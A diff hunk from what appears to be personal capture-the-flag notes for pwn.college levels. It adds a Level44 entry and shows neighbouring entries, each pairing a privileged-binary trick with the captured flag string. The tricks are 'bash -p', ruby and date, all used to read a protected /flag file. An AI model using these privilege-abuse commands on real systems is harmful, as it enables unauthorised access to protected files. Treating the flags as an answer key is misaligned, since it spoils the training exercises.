@@ -200,6 +200,11 @@ pwn.college{8y6gtiOYBGpKUUiwveBY6gTIN-H.0FN4EDLwIzW}
 /bin/ruby -0777 /flag
 pwn.college{0NiDqcgyIOxxyVuqsUevoUWPWku.0VN4EDLwIzW}
 
+## Level44
+bash -p
+cat /flag
+pwn.college{4yuHyvjg5JkFQkHlO71bMHyKkng.0lN4EDLwIzW}
+
 ## Level45
 /bin/date -f /flag
 /bin/date: invalid date ‘pwn.college{wE6uI_yqHLBDHheXFt90o32XpjH.01N4EDLwIzW}’
